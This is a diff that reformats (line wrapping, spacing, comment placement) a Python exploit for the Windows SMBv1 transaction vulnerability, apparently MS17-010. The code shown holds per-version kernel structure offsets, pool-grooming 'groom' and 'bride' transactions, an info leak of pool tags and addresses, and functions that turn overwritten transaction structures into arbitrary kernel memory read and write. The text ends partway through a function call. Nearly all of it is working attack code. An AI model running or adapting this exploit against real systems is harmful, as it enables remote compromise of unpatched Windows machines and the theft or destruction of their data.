@@ -132,8 +132,10 @@ WIN8_32_SESSION_INFO = {
 # win 2003 (xp 64 bit is win 2003)
 WIN2K3_64_SESSION_INFO = {
     'SESSION_ISNULL_OFFSET': 0xba,
-    'SESSION_SECCTX_OFFSET': 0xa0,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
-    'SECCTX_PCTXTHANDLE_OFFSET': 0x10,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
+    'SESSION_SECCTX_OFFSET': 0xa0,
+    # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    'SECCTX_PCTXTHANDLE_OFFSET': 0x10,
     'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
     'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
     'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
@@ -141,8 +143,10 @@ WIN2K3_64_SESSION_INFO = {
 
 WIN2K3_32_SESSION_INFO = {
     'SESSION_ISNULL_OFFSET': 0x96,
-    'SESSION_SECCTX_OFFSET': 0x80,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
-    'SECCTX_PCTXTHANDLE_OFFSET': 0xc,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
+    'SESSION_SECCTX_OFFSET': 0x80,
+    # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    'SECCTX_PCTXTHANDLE_OFFSET': 0xc,
     'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
     'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
     'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
@@ -151,7 +155,8 @@ WIN2K3_32_SESSION_INFO = {
 # win xp
 WINXP_32_SESSION_INFO = {
     'SESSION_ISNULL_OFFSET': 0x94,
-    'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    'SESSION_SECCTX_OFFSET': 0x84,
     'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
     'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
     'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
@@ -161,7 +166,8 @@ WINXP_32_SESSION_INFO = {
 
 WIN2K_32_SESSION_INFO = {
     'SESSION_ISNULL_OFFSET': 0x94,
-    'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    'SESSION_SECCTX_OFFSET': 0x84,
     'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
     'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
     'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
@@ -172,82 +178,84 @@ WIN2K_32_SESSION_INFO = {
 ###########################
 # for windows 2008+
 WIN7_32_TRANS_INFO = {
-    'TRANS_SIZE' : 0xa0,  # struct size
-    'TRANS_FLINK_OFFSET' : 0x18,
-    'TRANS_INPARAM_OFFSET' : 0x40,
-    'TRANS_OUTPARAM_OFFSET' : 0x44,
-    'TRANS_INDATA_OFFSET' : 0x48,
-    'TRANS_OUTDATA_OFFSET' : 0x4c,
-    'TRANS_PARAMCNT_OFFSET' : 0x58,
-    'TRANS_TOTALPARAMCNT_OFFSET' : 0x5c,
-    'TRANS_FUNCTION_OFFSET' : 0x72,
-    'TRANS_MID_OFFSET' : 0x80,
+    'TRANS_SIZE': 0xa0,  # struct size
+    'TRANS_FLINK_OFFSET': 0x18,
+    'TRANS_INPARAM_OFFSET': 0x40,
+    'TRANS_OUTPARAM_OFFSET': 0x44,
+    'TRANS_INDATA_OFFSET': 0x48,
+    'TRANS_OUTDATA_OFFSET': 0x4c,
+    'TRANS_PARAMCNT_OFFSET': 0x58,
+    'TRANS_TOTALPARAMCNT_OFFSET': 0x5c,
+    'TRANS_FUNCTION_OFFSET': 0x72,
+    'TRANS_MID_OFFSET': 0x80,
 }
 
 WIN7_64_TRANS_INFO = {
-    'TRANS_SIZE' : 0xf8,  # struct size
-    'TRANS_FLINK_OFFSET' : 0x28,
-    'TRANS_INPARAM_OFFSET' : 0x70,
-    'TRANS_OUTPARAM_OFFSET' : 0x78,
-    'TRANS_INDATA_OFFSET' : 0x80,
-    'TRANS_OUTDATA_OFFSET' : 0x88,
-    'TRANS_PARAMCNT_OFFSET' : 0x98,
-    'TRANS_TOTALPARAMCNT_OFFSET' : 0x9c,
-    'TRANS_FUNCTION_OFFSET' : 0xb2,
-    'TRANS_MID_OFFSET' : 0xc0,
+    'TRANS_SIZE': 0xf8,  # struct size
+    'TRANS_FLINK_OFFSET': 0x28,
+    'TRANS_INPARAM_OFFSET': 0x70,
+    'TRANS_OUTPARAM_OFFSET': 0x78,
+    'TRANS_INDATA_OFFSET': 0x80,
+    'TRANS_OUTDATA_OFFSET': 0x88,
+    'TRANS_PARAMCNT_OFFSET': 0x98,
+    'TRANS_TOTALPARAMCNT_OFFSET': 0x9c,
+    'TRANS_FUNCTION_OFFSET': 0xb2,
+    'TRANS_MID_OFFSET': 0xc0,
 }
 
 WIN5_32_TRANS_INFO = {
-    'TRANS_SIZE' : 0x98,  # struct size
-    'TRANS_FLINK_OFFSET' : 0x18,
-    'TRANS_INPARAM_OFFSET' : 0x3c,
-    'TRANS_OUTPARAM_OFFSET' : 0x40,
-    'TRANS_INDATA_OFFSET' : 0x44,
-    'TRANS_OUTDATA_OFFSET' : 0x48,
-    'TRANS_PARAMCNT_OFFSET' : 0x54,
-    'TRANS_TOTALPARAMCNT_OFFSET' : 0x58,
-    'TRANS_FUNCTION_OFFSET' : 0x6e,
-    'TRANS_PID_OFFSET' : 0x78,
-    'TRANS_MID_OFFSET' : 0x7c,
+    'TRANS_SIZE': 0x98,  # struct size
+    'TRANS_FLINK_OFFSET': 0x18,
+    'TRANS_INPARAM_OFFSET': 0x3c,
+    'TRANS_OUTPARAM_OFFSET': 0x40,
+    'TRANS_INDATA_OFFSET': 0x44,
+    'TRANS_OUTDATA_OFFSET': 0x48,
+    'TRANS_PARAMCNT_OFFSET': 0x54,
+    'TRANS_TOTALPARAMCNT_OFFSET': 0x58,
+    'TRANS_FUNCTION_OFFSET': 0x6e,
+    'TRANS_PID_OFFSET': 0x78,
+    'TRANS_MID_OFFSET': 0x7c,
 }
 
 WIN5_64_TRANS_INFO = {
-    'TRANS_SIZE' : 0xe0,  # struct size
-    'TRANS_FLINK_OFFSET' : 0x28,
-    'TRANS_INPARAM_OFFSET' : 0x68,
-    'TRANS_OUTPARAM_OFFSET' : 0x70,
-    'TRANS_INDATA_OFFSET' : 0x78,
-    'TRANS_OUTDATA_OFFSET' : 0x80,
-    'TRANS_PARAMCNT_OFFSET' : 0x90,
-    'TRANS_TOTALPARAMCNT_OFFSET' : 0x94,
-    'TRANS_FUNCTION_OFFSET' : 0xaa,
-    'TRANS_PID_OFFSET' : 0xb4,
-    'TRANS_MID_OFFSET' : 0xb8,
+    'TRANS_SIZE': 0xe0,  # struct size
+    'TRANS_FLINK_OFFSET': 0x28,
+    'TRANS_INPARAM_OFFSET': 0x68,
+    'TRANS_OUTPARAM_OFFSET': 0x70,
+    'TRANS_INDATA_OFFSET': 0x78,
+    'TRANS_OUTDATA_OFFSET': 0x80,
+    'TRANS_PARAMCNT_OFFSET': 0x90,
+    'TRANS_TOTALPARAMCNT_OFFSET': 0x94,
+    'TRANS_FUNCTION_OFFSET': 0xaa,
+    'TRANS_PID_OFFSET': 0xb4,
+    'TRANS_MID_OFFSET': 0xb8,
 }
 
 X86_INFO = {
-    'ARCH' : 'x86',
-    'PTR_SIZE' : 4,
-    'PTR_FMT' : 'I',
-    'FRAG_TAG_OFFSET' : 12,
-    'POOL_ALIGN' : 8,
-    'SRV_BUFHDR_SIZE' : 8,
+    'ARCH': 'x86',
+    'PTR_SIZE': 4,
+    'PTR_FMT': 'I',
+    'FRAG_TAG_OFFSET': 12,
+    'POOL_ALIGN': 8,
+    'SRV_BUFHDR_SIZE': 8,
 }
 
 X64_INFO = {
-    'ARCH' : 'x64',
-    'PTR_SIZE' : 8,
-    'PTR_FMT' : 'Q',
-    'FRAG_TAG_OFFSET' : 0x14,
-    'POOL_ALIGN' : 0x10,
-    'SRV_BUFHDR_SIZE' : 0x10,
+    'ARCH': 'x64',
+    'PTR_SIZE': 8,
+    'PTR_FMT': 'Q',
+    'FRAG_TAG_OFFSET': 0x14,
+    'POOL_ALIGN': 0x10,
+    'SRV_BUFHDR_SIZE': 0x10,
 }
+
 
 def merge_dicts(*dict_args):
     result = {}
     for dictionary in dict_args:
         result.update(dictionary)
     return result
+
 
 OS_ARCH_INFO = {
     # for Windows Vista, 2008, 7 and 2008 R2
@@ -281,14 +289,16 @@ HEAP_HDR_SIZE = 8  # heap chunk header size
 def calc_alloc_size(size, align_size):
     return (size + align_size - 1) & ~(align_size-1)
 
+
 def wait_for_request_processed(conn):
-    #time.sleep(0.05)
+    # time.sleep(0.05)
     # send echo is faster than sleep(0.05) when connection is very good
     conn.send_echo('a')
 
+
 def find_named_pipe(conn):
-    pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]
-    
+    pipes = ['browser', 'spoolss', 'netlogon', 'lsarpc', 'samr']
+
     tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
     found_pipe = None
     for pipe in pipes:
@@ -299,18 +309,21 @@ def find_named_pipe(conn):
             break
         except smb.SessionError as e:
             pass
-    
+
     conn.disconnect_tree(tid)
     return found_pipe
 
 
 special_mid = 0
 extra_last_mid = 0
+
+
 def reset_extra_mid(conn):
     global extra_last_mid, special_mid
     special_mid = (conn.next_mid() & 0xff00) - 0x100
     extra_last_mid = special_mid
-    
+
+
 def next_extra_mid():
     global extra_last_mid
     extra_last_mid += 1
@@ -322,19 +335,22 @@ def next_extra_mid():
 # Note: the GROOM_TRANS_SIZE size MUST be multiple of 16 to make FRAG_TAG_OFFSET valid
 GROOM_TRANS_SIZE = 0x5010
 
+
 def leak_frag_size(conn, tid, fid):
     # this method can be used on Windows Vista/2008 and later
     # leak "Frag" pool size and determine target architecture
     info = {}
-    
+
     # A "Frag" pool is placed after the large pool allocation if last page has some free space left.
     # A "Frag" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.
     # To make exploit more generic, exploit does info leak to find a "Frag" pool size.
     # From the leak info, we can determine the target architecture too.
     mid = conn.next_mid()
-    req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
-    req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) # leak more 276 bytes
-    
+    req1 = conn.create_nt_trans_packet(5, param=pack(
+        '<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
+    req2 = conn.create_nt_trans_secondary_packet(
+        mid, data='B'*276)  # leak more 276 bytes
+
     conn.send_raw(req1[:-8])
     conn.send_raw(req1[-8:]+req2)
     leakData = conn.recv_transaction_data(mid, 0x10d0+276)
@@ -343,15 +359,17 @@ def leak_frag_size(conn, tid, fid):
     if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
         logger.log.debug('Target is 32 bit')
         info['arch'] = 'x86'
-        info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
+        info['FRAG_POOL_SIZE'] = ord(
+            leakData[X86_INFO['FRAG_TAG_OFFSET']-2]) * X86_INFO['POOL_ALIGN']
     elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
         logger.log.debug('Target is 64 bit')
         info['arch'] = 'x64'
-        info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
+        info['FRAG_POOL_SIZE'] = ord(
+            leakData[X64_INFO['FRAG_TAG_OFFSET']-2]) * X64_INFO['POOL_ALIGN']
     else:
         logger.log.debug('Not found Frag pool tag in leak data')
         sys.exit()
-    
+
     logger.log.debug('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
     return info
 
@@ -360,40 +378,50 @@ def read_data(conn, info, read_addr, read_size):
     fmt = info['PTR_FMT']
     # modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data
     # modify trans2.*ParameterCount and trans2.*DataCount to limit data
-    new_data = pack('<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
+    new_data = pack('<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'],
+                    info['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
     new_data += pack('<II', 0, 0)  # SetupCount, MaxSetupCount
-    new_data += pack('<III', 8, 8, 8)  # ParamterCount, TotalParamterCount, MaxParameterCount
-    new_data += pack('<III', read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
+    # ParamterCount, TotalParamterCount, MaxParameterCount
+    new_data += pack('<III', 8, 8, 8)
+    # DataCount, TotalDataCount, MaxDataCount
+    new_data += pack('<III', read_size, read_size, read_size)
     new_data += pack('<HH', 0, 5)  # Category, Function (NT_RENAME)
-    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
-    
+    conn.send_nt_trans_secondary(
+        mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
+
     # create one more transaction before leaking data
     # - next transaction can be used for arbitrary read/write after the current trans2 is done
     # - next transaction address is from TransactionListEntry.Flink value
-    conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)
+    conn.send_nt_trans(5, param=pack(
+        '<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)
 
     # finish the trans2 to leak
     conn.send_nt_trans_secondary(mid=info['trans2_mid'])
     read_data = conn.recv_transaction_data(info['trans2_mid'], 8+read_size)
-    
+
     # set new trans2 address
-    info['trans2_addr'] = unpack_from('<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
-    
+    info['trans2_addr'] = unpack_from(
+        '<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
+
     # set trans1.InData to &trans2
-    conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
+    conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack(
+        '<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
     wait_for_request_processed(conn)
 
     # modify trans2 mid
-    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
+    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack(
+        '<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
     wait_for_request_processed(conn)
-    
+
     return read_data[8:]  # no need to return parameter
+
 
 def write_data(conn, info, write_addr, write_data):
     # trans2.InData
-    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
+    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack(
+        '<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
     wait_for_request_processed(conn)
-    
+
     # write data
     conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
     wait_for_request_processed(conn)
@@ -403,23 +431,28 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
     trans_param = pack('<HH', fid, 0)  # param for NT_RENAME
     # fill large pagedpool holes (maybe no need)
     for i in range(numFill):
-        conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)
+        conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0,
+                           maxParameterCount=GROOM_TRANS_SIZE-0x10d0)
 
     mid_ntrename = conn.next_mid()
     # first GROOM, for leaking next BRIDE transaction
-    req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
-    req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B'*276) # leak more 276 bytes
+    req1 = conn.create_nt_trans_packet(
+        5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
+    req2 = conn.create_nt_trans_secondary_packet(
+        mid_ntrename, data='B'*276)  # leak more 276 bytes
     # second GROOM, for controlling next BRIDE transaction
-    req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)
+    req3 = conn.create_nt_trans_packet(
+        5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)
     # many BRIDEs, expect two of them are allocated at splitted pool from GROOM
     reqs = []
     for i in range(12):
         mid = next_extra_mid()
-        reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))
+        reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param,
+                                             totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))
 
     conn.send_raw(req1[:-8])
     conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
-    
+
     # expected transactions alignment ("Frag" pool is not shown)
     #
     #    |         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |
@@ -440,7 +473,7 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
     if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
         logger.log.debug('Not found Frag pool tag in leak data')
         return None
-    
+
     # ================================
     # verify leak data
     # ================================
@@ -455,8 +488,10 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
     leakTrans = leakData[leakTransOffset:]
 
     ptrf = info['PTR_FMT']
-    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+ptrf*5, leakTrans, 8)
-    inparam_value = unpack_from('<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
+    _, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from(
+        '<'+ptrf*5, leakTrans, 8)
+    inparam_value = unpack_from(
+        '<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
     leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
 
     logger.log.debug('CONNECTION: 0x{:x}'.format(connection_addr))
@@ -467,7 +502,8 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
 
     next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
     if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
-        logger.log.debug('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
+        logger.log.debug('unexpected alignment, diff: 0x{:x}'.format(
+            flink_value - next_page_addr))
         return None
     # trans1: leak transaction
     # trans2: next transaction
@@ -480,31 +516,38 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
         'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
     }
 
+
 def exploit_matched_pairs(conn, pipe_name, info):
     # for Windows 7/2008 R2 and later
-    
+
     tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
     conn.set_default_tid(tid)
     # fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
     fid = conn.nt_create_andx(tid, pipe_name)
-    
+
     info.update(leak_frag_size(conn, tid, fid))
     # add os and arch specific exploit info
     info.update(OS_ARCH_INFO[info['os']][info['arch']])
-    
+
     # groom: srv buffer header
-    info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
+    info['GROOM_POOL_SIZE'] = calc_alloc_size(
+        GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
     logger.log.debug('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
     # groom paramters and data is alignment by 8 because it is NT_TRANS
-    info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  # alignment (4)
+    info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - \
+        TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  # alignment (4)
 
     # bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
-    bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
-    info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
-    logger.log.debug('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
+    bridePoolSize = 0x1000 - \
+        (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
+    info['BRIDE_TRANS_SIZE'] = bridePoolSize - \
+        (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
+    logger.log.debug('BRIDE_TRANS_SIZE: 0x{:x}'.format(
+        info['BRIDE_TRANS_SIZE']))
     # bride paramters and data is alignment by 4 because it is TRANS
-    info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
-    
+    info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - \
+        TRANS_NAME_LEN - info['TRANS_SIZE']
+
     # ================================
     # try align pagedpool and leak info until satisfy
     # ================================
@@ -518,14 +561,14 @@ def exploit_matched_pairs(conn, pipe_name, info):
         logger.log.info('leak failed... try again')
         conn.close(tid, fid)
         conn.disconnect_tree(tid)
-        
+
         tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
         conn.set_default_tid(tid)
         fid = conn.nt_create_andx(tid, pipe_name)
 
     if leakInfo is None:
         return False
-    
+
     info['fid'] = fid
     info.update(leakInfo)
 
@@ -538,16 +581,20 @@ def exploit_matched_pairs(conn, pipe_name, info):
     # Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.
     #       So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
     # maxParameterCount (0x1000), trans name (4), param (4)
-    indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
+    indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + \
+        8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
     indata_next_trans_displacement = info['trans2_addr'] - indata_value
-    conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
+    conn.send_nt_trans_secondary(
+        mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
     wait_for_request_processed(conn)
 
     # if the overwritten is correct, a modified transaction mid should be special_mid now.
     # a new transaction with special_mid should be error.
-    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
+    recvPkt = conn.send_nt_trans(
+        5, mid=special_mid, param=pack('<HH', fid, 0), data='')
     if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
-        logger.log.debug('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+        logger.log.debug(
+            'unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
         logger.log.debug('!!! Write to wrong place !!!')
         logger.log.info('the target might be crashed')
         return False
@@ -557,30 +604,34 @@ def exploit_matched_pairs(conn, pipe_name, info):
     # NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
     # but this method make the transation never get freed
     # I will avoid memory leak
-    
+
     # ================================
     # modify trans1 struct to be used for arbitrary read/write
     # ================================
     logger.log.debug('modify trans1 struct for arbitrary read/write')
     fmt = info['PTR_FMT']
     # use transGroom to modify trans2.InData to &trans1. so we can modify trans1 with trans2 data
-    conn.send_nt_trans_secondary(mid=fid, data=pack('<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
+    conn.send_nt_trans_secondary(mid=fid, data=pack(
+        '<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
     wait_for_request_processed(conn)
 
     # modify
     # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
     # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
-    conn.send_nt_trans_secondary(mid=special_mid, data=pack('<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
+    conn.send_nt_trans_secondary(mid=special_mid, data=pack(
+        '<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
     wait_for_request_processed(conn)
 
     # modify trans2.mid
     info['trans2_mid'] = conn.next_mid()
-    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
+    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack(
+        '<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
     return True
+
 
 def exploit_fish_barrel(conn, pipe_name, info):
     # for Windows Vista/2008 and earlier
-    
+
     tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
     conn.set_default_tid(tid)
     # fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
@@ -590,17 +641,18 @@ def exploit_fish_barrel(conn, pipe_name, info):
     if info['os'] == 'WIN7' and 'arch' not in info:
         # leak_frag_size() can be used against Windows Vista/2008 to determine target architecture
         info.update(leak_frag_size(conn, tid, fid))
-    
+
     if 'arch' in info:
         # add os and arch specific exploit info
         info.update(OS_ARCH_INFO[info['os']][info['arch']])
-        attempt_list = [ OS_ARCH_INFO[info['os']][info['arch']] ]
+        attempt_list = [OS_ARCH_INFO[info['os']][info['arch']]]
     else:
         # do not know target architecture
         # this case is only for Windows 2003
         # try offset of 64 bit then 32 bit because no target architecture
-        attempt_list = [ OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86'] ]
-    
+        attempt_list = [OS_ARCH_INFO[info['os']]
+                        ['x64'], OS_ARCH_INFO[info['os']]['x86']]
+
     # ================================
     # groom packets
     # ================================
@@ -610,8 +662,9 @@ def exploit_fish_barrel(conn, pipe_name, info):
     trans_param = pack('<HH', info['fid'], 0)
     for i in range(12):
         mid = info['fid'] if i == 8 else next_extra_mid()
-        conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0) 
-    
+        conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100 -
+                        TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)
+
     # expected transactions alignment
     #
     #    +-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+
@@ -624,24 +677,29 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # ================================
     shift_indata_byte = 0x200
     conn.do_write_andx_raw_pipe(info['fid'], 'A'*shift_indata_byte)
-    
+
     # ================================
     # Dangerous operation: attempt to control one transaction
     # ================================
     # Note: POOL_ALIGN value is same as heap alignment value
     success = False
     for tinfo in attempt_list:
-        logger.log.debug('attempt controlling next transaction on ' + tinfo['ARCH'])
-        HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
-        NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
+        logger.log.debug(
+            'attempt controlling next transaction on ' + tinfo['ARCH'])
+        HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (
+            tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
+        NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + \
+            HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
 
         # Below operation is dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
-        conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
+        conn.send_trans_secondary(
